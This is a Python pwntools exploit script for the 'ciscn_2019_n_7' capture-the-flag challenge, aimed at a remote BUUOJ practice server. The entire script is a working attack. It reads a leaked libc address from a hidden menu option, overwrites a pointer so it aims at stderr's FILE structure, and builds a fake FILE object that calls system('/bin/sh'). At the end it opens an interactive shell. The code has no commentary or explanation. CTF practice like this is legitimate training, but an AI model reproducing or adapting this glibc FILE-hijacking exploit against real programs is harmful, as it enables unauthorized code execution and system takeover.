from pwn import *

p = None
r = lambda x:p.recv(x)
rl = lambda:p.recvline
ru = lambda x:p.recvuntil(x)
rud = lambda x:p.recvuntil(x,drop=True)
s = lambda x:p.send(x)
sl = lambda x:p.sendline(x)
sla = lambda x,y:p.sendlineafter(x,y)
sa = lambda x,y:p.sendafter(x,y)
rn = lambda x:p.recvn(x)

def add(length,name):
    sla('-> ',str(1))
    sla('Length: ',str(length))
    sa('name:',name)

def pwn():
    global p
    BIN_PATH = './ciscn_2019_n_7'
    DEBUG = 0
    ATTACH = 0
    context.arch = 'amd64'
    if DEBUG == 1:
        p = process(BIN_PATH)
        elf = ELF(BIN_PATH)
        context.log_level = 'debug'
        context.terminal = ['tmux', 'split', '-h']
        if context.arch == 'amd64':
            libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        else:
            libc = ELF('/lib/i386-linux-gnu/libc.so.6')

    else:
        p = remote('node3.buuoj.cn',27039)
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        context.log_level = 'debug'
    # 0x555555554000
    if ATTACH==1:
        gdb.attach(p,'''
        b *0x555555554000+0xa77
        b *0xf30+0x555555554000
        ''')
    sla('-> \n',str(666))
    # print ru('\n')
    libc_base = int(ru('\n')[:-1],16)-libc.sym['puts']
    log.info('libc addr: '+hex(libc_base))
    # add
    payload = 'a'*8+p64(libc_base+libc.sym['_IO_2_1_stderr_'])
    add(0xe0,payload)
    sla('-> \n',str(2))
    sla('New ','e3pem')
    fake_file = ('/bin/sh\x00')
    fake_file +=p64(0x61)
    fake_file +=p64(0)
    fake_file +=p64(libc.sym['_IO_list_all']-0x10)
    fake_file +=p64(0)
    fake_file +=p64(1)
    fake_file += p64(0)
    fake_file +=p64(0)*2
    fake_file +=p64(libc_base+libc.sym['system'])*1
    fake_file +=p64(0)*10
    fake_file +=p64(0)
    fake_file +=p64(0)*3
    fake_file +=p64(0)
    fake_file = fake_file.ljust(0xd8,'\x00')
    fake_file += p64(libc_base+libc.sym['_IO_2_1_stderr_']+8*6)
    payload = fake_file
    print hex(len(fake_file))
    sla('contents:\n',payload)
    ru('Over.')
    sla('-> \n',str(4))

    p.interactive()

if __name__ == '__main__':
    pwn()